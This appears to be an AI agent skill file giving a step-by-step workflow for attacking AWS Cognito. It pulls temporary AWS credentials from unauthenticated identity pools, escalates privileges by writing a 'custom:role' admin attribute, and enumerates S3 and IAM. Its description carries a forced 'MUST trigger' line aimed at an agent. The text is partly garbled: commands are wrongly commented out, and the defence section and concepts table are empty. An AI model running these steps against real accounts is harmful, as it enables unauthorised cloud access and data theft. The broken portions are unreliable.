---
name: aws-cognito-abuse
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Exploit misconfigurations in AWS Cognito, specifically focusing on unauthorized identity pool access, 
  user pool self-registration issues, and privilege escalation via custom attributes to access broader 
  AWS infrastructure.
domain: cybersecurity
subdomain: penetration-testing
category: Cloud Security
difficulty: advanced
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0001, TA0004, TA0006]
  techniques: [T1199, T1078, T1098]
platforms: [aws, web]
tags: [aws, cognito, cloud-security, iam, serverless, privilege-escalation, pentesting]
tools: [aws-cli, pacu, burp-suite]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# AWS Cognito Abuse

## When to Use
- When testing applications hosted on AWS that utilize Amazon Cognito for user authentication (User Pools) and authorization (Identity Pools).
- To demonstrate how improper attribute mapping or overly permissive unauthenticated roles in Cognito can lead to full AWS account compromise.

## Workflow

### Phase 1: Identifying Cognito Parameters

```bash
# grep -r "us-east-1:[0-9a-fA-F-]*" .
```

### Phase 2: Exploiting Identity Pools (Unauthenticated Access)

```bash
# aws cognito-identity get-id --identity-pool-id "us-east-1:xxxx-xxxx-xxxx" --region us-east-1

# aws cognito-identity get-credentials-for-identity --identity-id "us-east-1:yyyy-yyyy-yyyy" --region us-east-1

# export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

### Phase 3: Exploiting User Pools (Self-Registration & Attributes)

```bash
# aws cognito-idp sign-up --client-id xxx --username testuser@hacker.com --password "Password123!"

# aws cognito-idp update-user-attributes --access-token yyy --user-attributes Name="custom:role",Value="admin"
```

### Phase 4: Exploiting IAM Privileges

```bash
# aws sts get-caller-identity
aws s3 ls
aws iam list-roles
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Discover Pool IDs ] --> B{Identity Pool Access? ]}
    B -->|Yes| C[Get Temporary AWS Credentials ]
    B -->|No| D[Analyze User Pool ]
    C --> E[Enumerate AWS Environment ]
```

## 🔵 Blue Team Detection & Defense
- **Disable Unauthenticated Access**: **Attribute Write Permissions**: **Least Privilege IAM**: Key Concepts
| Concept | Description |
|---------|-------------|
| Amazon Cognito | |
| Identity Pools vs User Pools | |

## References
- Notion Security: [Cognito Security Misconfigurations](https://notion.so/security)
- AWS Docs: [Amazon Cognito Authentication Flow](https://docs.aws.amazon.com/cognito/latest/developerguide/authentication-flow.html)
